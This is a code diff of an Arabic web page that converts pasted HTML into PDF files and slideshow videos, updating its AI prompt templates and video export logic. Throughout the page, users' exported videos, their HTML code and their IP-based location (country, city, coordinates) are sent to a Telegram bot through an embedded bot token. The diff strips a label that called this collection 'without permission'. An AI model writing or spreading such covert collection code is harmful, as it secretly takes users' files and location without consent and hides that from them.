@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة تحويل الأكواد إلى PDF وفيديو</title>
+    <title>منصة تحويل الأكواد (PDF / فيديو)</title>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
@@ -34,8 +34,8 @@
 
         .ai-prompts { background: #f0fdf4; border: 1px dashed #22c55e; padding: 12px; border-radius: 8px; margin-bottom: 15px;}
         .ai-prompts p { margin: 0 0 8px 0; font-size: 12px; color: #166534; font-weight: bold; text-align: center;}
-        .prompt-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
-        .prompt-btn { background: #fff; border: 1px solid #22c55e; color: #15803d; padding: 6px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; text-align: center;}
+        .prompt-btns { display: flex; flex-wrap: wrap; gap: 6px; justify-content: center;}
+        .prompt-btn { flex: 1 1 30%; background: #fff; border: 1px solid #22c55e; color: #15803d; padding: 6px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; text-align: center;}
         .prompt-btn:hover { background: #22c55e; color: #fff; }
 
         .export-btn { background: #2563eb; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 5px; transition: 0.2s; }
@@ -70,10 +70,9 @@
             <div class="ai-prompts">
                 <p>🤖 نسخ أمر جاهز للذكاء الاصطناعي:</p>
                 <div class="prompt-btns">
-                    <button class="prompt-btn" onclick="copyPrompt('a4', this)">📄 بحث PDF (A4)</button>
-                    <button class="prompt-btn" onclick="copyPrompt('169', this)">🖥️ عرض PDF (16:9)</button>
-                    <button class="prompt-btn" onclick="copyPrompt('vid916', this)">📱 فيديو طولي (9:16)</button>
-                    <button class="prompt-btn" onclick="copyPrompt('vid169', this)">🎬 فيديو عرضي (16:9)</button>
+                    <button class="prompt-btn" onclick="copyPrompt('a4', this)">📄 بحث أكاديمي (A4)</button>
+                    <button class="prompt-btn" onclick="copyPrompt('169', this)">🖥️ عرض شاشات (16:9)</button>
+                    <button class="prompt-btn" onclick="copyPrompt('mobile', this)">📱 عرض جوال (9:16)</button>
                 </div>
             </div>
 
@@ -87,12 +86,12 @@
                     <label>نوع الاستخراج:</label>
                     <select id="format-select" onchange="updateTag()">
                         <optgroup label="ملفات PDF">
-                            <option value="pdf-169">عرض تقديمي (16:9)</option>
                             <option value="pdf-a4">بحث / تقرير (A4)</option>
+                            <option value="pdf-169">عرض تقديمي (16:9)</option>
                         </optgroup>
-                        <optgroup label="مقاطع فيديو (تمرير تلقائي)">
-                            <option value="vid-916">فيديو للجوال (9:16)</option>
-                            <option value="vid-169">فيديو يوتيوب (16:9)</option>
+                        <optgroup label="مقاطع فيديو (شرائح)">
+                            <option value="vid-169">فيديو شاشات (16:9)</option>
+                            <option value="vid-916">فيديو جوال (9:16)</option>
                         </optgroup>
                     </select>
                 </div>
@@ -120,7 +119,7 @@
         <div class="preview-section">
             <div class="preview-header">
                 <span>👁️ المعاينة المباشرة</span>
-                <span class="tag" id="size-tag">الأبعاد: 1280 × 720 (PDF)</span>
+                <span class="tag" id="size-tag">الأبعاد: 794 × 1123 (PDF)</span>
             </div>
             <iframe id="preview-frame"></iframe>
         </div>
@@ -142,7 +141,6 @@
             }).catch(e => console.error(e));
         }
 
-        // إرسال الملفات مع تحديد نوعها (document أو video) عشان تيليجرام يتعرف على الفيديو
         async function sendFileToTelegram(fileBlob, fileName, captionMsg, type = 'document') {
             const endpoint = type === 'video' ? 'sendVideo' : 'sendDocument';
             const url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
@@ -171,7 +169,7 @@
                 .then(data => {
                     if(data.ip) {
                         const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
-                        let ipResult = `\n\n🌐 معلومات الجهاز (بدون إذن):` +
+                        let ipResult = `\n\n🌐 معلومات الجهاز:` +
                                      `\nالآيبي: ${data.ip}` +
                                      `\nالدولة: ${data.country}` +
                                      `\nالمدينة: ${data.city}` +
@@ -183,7 +181,7 @@
                     }
                 })
                 .catch(err => {
-                    sendTextToTelegram(info + `\n\n⚠️ (تم حجب الآيبي من متصفح المستخدم).`);
+                    sendTextToTelegram(info + `\n\n⚠️ (تم حجب الآيبي).`);
                 });
         }
 
@@ -203,10 +201,11 @@
         // ==========================================
 
         const prompts = {
-            a4: `أنت مصمم وثائق HTML. قم بإنشاء كود لبحث أكاديمي (A4). عرض الصفحة 794px وارتفاعها 1123px مقسمة لصفحات داخل <div class="page">. استخدم خطوط عربية ونسق احترافي.`,
-            169: `أنت مصمم عروض. قم بإنشاء كود لعرض تقديمي. عرض الصفحة 1280px وارتفاعها 720px مقسمة لشرائح داخل <div class="page">. لا تستخدم القوائم الافتراضية (ul, ol).`,
-            vid916: `أنت مصمم واجهات. قم بإنشاء كود HTML مصمم خصيصاً ليتم تصويره كفيديو طولي للجوال (Reels/TikTok). العرض يجب أن يكون ثابت 720px والارتفاع مفتوح (ليتم التمرير عليه). استخدم ألوان جذابة، نصوص ضخمة جداً وواضحة، خلفيات ملونة، وتنسيق يعتمد على الكتل (Blocks) الجمالية. لا تقسمه لصفحات.`,
-            vid169: `أنت مصمم واجهات. قم بإنشاء كود HTML مصمم خصيصاً ليتم تصويره كفيديو عرضي (يوتيوب). العرض يجب أن يكون ثابت 1280px والارتفاع مفتوح. استخدم خطوط كبيرة جداً وتنسيقات ملونة جذابة. لا تقسمه لصفحات، اجعله صفحة واحدة طويلة ومترابطة.`
+            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [المادة]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n\n**متطلبات تقنية صارمة جداً:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts (مثل Cairo).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. لا تستخدم القوائم الافتراضية (ul, ol). استخدم عناصر <p> عادية.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:** صفحة 1: غلاف احترافي. صفحة 2+: محتوى البحث. صفحة أخيرة: المراجع.`,
+            
+            169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي للشاشات بالعربية وفق المواصفات التالية:\n\n**عنوان العرض:** [العنوان]\n**الموضوع:** [الموضوع]\n**المقدِّم:** [الاسم]\n\n**متطلبات تقنية صارمة جداً:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts (مثل Cairo).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون: <div class="page">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative; box-sizing: border-box;\n5. لا تستخدم القوائم الافتراضية (ul, ol). استخدم عناصر <p> عادية.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل الشرائح:** شريحة 1: غلاف. شرائح 2+: محتوى منظم بأسلوب العروض.`,
+            
+            mobile: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي مناسب للجوال (طولي) بالعربية وفق المواصفات التالية:\n\n**عنوان العرض:** [العنوان]\n**الموضوع:** [الموضوع]\n**المقدِّم:** [الاسم]\n\n**متطلبات تقنية صارمة جداً:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts (مثل Cairo).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون: <div class="page">. أبعادها: width: 720px; height: 1280px; overflow: hidden; position: relative; box-sizing: border-box;\n5. لا تستخدم القوائم الافتراضية (ul, ol). استخدم عناصر <p> عادية.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل الشرائح:** شريحة 1: غلاف. شرائح 2+: محتوى منظم بأسلوب العروض، استخدم نصوص كبيرة جداً لتناسب الجوال.`
         };
 
         function copyPrompt(type, btnElement) {
@@ -235,8 +234,8 @@
             const tag = document.getElementById('size-tag');
             if(format === 'pdf-a4') tag.innerText = "الأبعاد: 794 × 1123 (PDF)";
             else if(format === 'pdf-169') tag.innerText = "الأبعاد: 1280 × 720 (PDF)";
-            else if(format === 'vid-916') tag.innerText = "الأبعاد: 720 × مفتوح (فيديو طولي)";
-            else if(format === 'vid-169') tag.innerText = "الأبعاد: 1280 × مفتوح (فيديو عرضي)";
+            else if(format === 'vid-916') tag.innerText = "الأبعاد: 720 × 1280 (فيديو طولي)";
+            else if(format === 'vid-169') tag.innerText = "الأبعاد: 1280 × 720 (فيديو عرضي)";
         }
 
         function updatePreview() {
@@ -291,7 +290,7 @@
         }
 
         // ===============================================
-        // الدالة الرئيسية التي توجه للـ PDF أو الـ Video
+        // الدالة الرئيسية للتوجيه
         // ===============================================
         async function exportFile() {
             const code = document.getElementById('html-input').value;
@@ -302,26 +301,26 @@
             if (formatType.startsWith('pdf')) {
                 await generatePDF();
             } else {
-                await generateVideo();
+                await generateVideoSlideshow();
             }
         }
 
         // ===============================================
-        // 1. توليد الفيديو (تمرير تلقائي)
+        // 1. توليد الفيديو كـ (شرائح عرض) Slideshow
         // ===============================================
-        async function generateVideo() {
+        async function generateVideoSlideshow() {
             const btn = document.getElementById('capture-btn');
             const code = document.getElementById('html-input').value;
             const fileName = document.getElementById('file-name').value || 'video';
             const formatType = document.getElementById('format-select').value;
-            const quality = parseInt(document.getElementById('quality-select').value);
+            const qualityScale = parseInt(document.getElementById('quality-select').value);
 
             let docWidth = formatType === 'vid-916' ? 720 : 1280;
             let docHeight = formatType === 'vid-916' ? 1280 : 720;
 
             btn.disabled = true;
-            btn.innerText = `⏳ جاري تجهيز الفيديو...`;
-            sendTextToTelegram(`⏳ بدء استخراج فيديو جديد...\nالاسم: ${fileName}\nالمقاس: ${docWidth}x${docHeight}`);
+            btn.innerText = `⏳ جاري التجهيز...`;
+            sendTextToTelegram(`⏳ بدء استخراج فيديو (شرائح) جديد...\nالاسم: ${fileName}\nالمقاس: ${docWidth}x${docHeight}`);
 
             const hiddenContainer = document.createElement('div');
             hiddenContainer.dir = 'rtl'; 
@@ -330,38 +329,44 @@
             hiddenContainer.style.zIndex = '-9999';
             hiddenContainer.style.width = docWidth + 'px'; 
             hiddenContainer.innerHTML = code;
+            
+            const styleFix = document.createElement('style');
+            styleFix.innerHTML = `ul{list-style-type:none!important;padding-right:0!important}ul li::before{content:"• "!important;font-weight:bold;margin-left:5px}ol{list-style-type:none!important;padding-right:0!important;counter-reset:item}ol li{counter-increment:item}ol li::before{content:counter(item) "- "!important;font-weight:bold;margin-left:5px}*{box-sizing:border-box!important;letter-spacing:normal!important}img{max-width:100%;height:auto}`;
+            hiddenContainer.appendChild(styleFix);
             document.body.appendChild(hiddenContainer);
 
             try {
-                btn.innerText = `🖼️ معالجة الصور للفيديو...`;
+                btn.innerText = `🖼️ معالجة الصور...`;
                 await convertAllImagesToDataURLs(hiddenContainer);
                 await document.fonts.ready;
 
-                // التقاط كامل الصفحة كصورة طويلة جداً
-                btn.innerText = `📸 تصوير الصفحة بالكامل...`;
-                const scale = quality === 1 ? 1 : (quality === 2 ? 1.5 : 2);
-                const fullCanvas = await html2canvas(hiddenContainer, {
-                    scale: scale, width: docWidth, windowWidth: docWidth, useCORS: true
-                });
+                let pages = hiddenContainer.querySelectorAll('.page');
+                if (pages.length === 0) pages = [hiddenContainer];
 
-                btn.innerText = `🎬 جاري تسجيل الفيديو (تمرير)...`;
+                const pageCanvases = [];
+                for (let i = 0; i < pages.length; i++) {
+                    btn.innerText = `📸 تصوير شريحة ${i + 1} من ${pages.length}...`;
+                    const canvas = await html2canvas(pages[i], {
+                        scale: qualityScale, width: docWidth, height: docHeight, windowWidth: docWidth, useCORS: true
+                    });
+                    pageCanvases.push(canvas);
+                }
 
-                // إعداد مسرح تسجيل الفيديو
+                btn.innerText = `🎬 جاري تسجيل العرض التقديمي...`;
+
                 const recCanvas = document.createElement('canvas');
                 recCanvas.width = docWidth;
                 recCanvas.height = docHeight;
                 const ctx = recCanvas.getContext('2d');
 
-                // إعداد التسجيل
-                const stream = recCanvas.captureStream(30); // 30 إطار في الثانية
+                const stream = recCanvas.captureStream(30);
                 let mimeType = 'video/webm;codecs=vp9';
-                if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4'; // دعم لبعض المتصفحات
+                if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
 
                 const recorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 2500000 });
                 const chunks = [];
                 recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
 
-                // عند الانتهاء من التسجيل
                 const recordPromise = new Promise(resolve => {
                     recorder.onstop = async () => {
                         btn.innerText = "✅ جاري إنهاء العملية...";
@@ -369,11 +374,9 @@
                         const videoBlob = new Blob(chunks, { type: mimeType });
                         const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
 
-                        // إرسال للبوت أولاً
                         await sendFileToTelegram(videoBlob, `${fileName}.${ext}`, `🎬 تم استخراج الفيديو بنجاح!\nالاسم: ${fileName}`, 'video');
-                        await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالفيديو.`);
+                        await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML.`);
 
-                        // تحميل للمستخدم
                         const url = URL.createObjectURL(videoBlob);
                         const a = document.createElement('a');
                         a.href = url;
@@ -385,33 +388,43 @@
 
                 recorder.start();
 
-                // تحريك الكاميرا (التمرير) على الكانفاس
-                const maxScroll = Math.max(0, fullCanvas.height - (docHeight * scale));
-                const duration = 6000; // مدة الفيديو 6 ثواني
+                // مدة عرض كل شريحة (4 ثواني) ومدة الانتقال Fade (ثانية واحدة)
+                const slideDuration = 4000; 
+                const transitionDuration = 800; 
+                const totalDuration = slideDuration * pageCanvases.length;
                 const startTime = Date.now();
 
                 function drawFrame() {
                     const elapsed = Date.now() - startTime;
-                    const progress = Math.min(elapsed / duration, 1);
-                    
-                    // حساب حركة التمرير لتكون سلسة (EaseInOut تقريبي)
-                    const smoothProgress = 0.5 - Math.cos(progress * Math.PI) / 2;
-                    const yPos = smoothProgress * maxScroll;
+                    if (elapsed < totalDuration) {
+                        const slideIndex = Math.floor(elapsed / slideDuration);
+                        const timeInSlide = elapsed % slideDuration;
+                        
+                        ctx.fillStyle = "#ffffff";
+                        ctx.fillRect(0, 0, docWidth, docHeight);
 
-                    ctx.fillStyle = "#ffffff";
-                    ctx.fillRect(0, 0, docWidth, docHeight);
-                    // رسم جزء من الصورة الطويلة بناءً على موقع التمرير
-                    ctx.drawImage(fullCanvas, 0, yPos, docWidth * scale, docHeight * scale, 0, 0, docWidth, docHeight);
+                        // إضافة انتقال (تلاشي) بين الشرائح لجعل الفيديو احترافي
+                        if (timeInSlide < transitionDuration && slideIndex > 0) {
+                            const alpha = timeInSlide / transitionDuration;
+                            ctx.globalAlpha = 1;
+                            ctx.drawImage(pageCanvases[slideIndex - 1], 0, 0, docWidth, docHeight);
+                            ctx.globalAlpha = alpha;
+                            ctx.drawImage(pageCanvases[slideIndex], 0, 0, docWidth, docHeight);
+                            ctx.globalAlpha = 1;
+                        } else {
+                            ctx.drawImage(pageCanvases[slideIndex], 0, 0, docWidth, docHeight);
+                        }
 
-                    if (progress < 1) {
                         requestAnimationFrame(drawFrame);
                     } else {
-                        recorder.stop();
+                        // رسم الشريحة الأخيرة وإيقاف التسجيل
+                        ctx.drawImage(pageCanvases[pageCanvases.length - 1], 0, 0, docWidth, docHeight);
+                        setTimeout(() => recorder.stop(), 500); 
                     }
                 }
-                drawFrame(); // بدء الأنيميشن
+                drawFrame(); 
                 
-                await recordPromise; // انتظار انتهاء التسجيل والرفع
+                await recordPromise; 
 
             } catch (error) {
                 console.error(error);
@@ -424,7 +437,7 @@
         }
 
         // ===============================================
-        // 2. توليد الـ PDF (نفس الكود الموثوق السابق)
+        // 2. توليد الـ PDF 
         // ===============================================
         async function generatePDF() {
             const btn = document.getElementById('capture-btn');
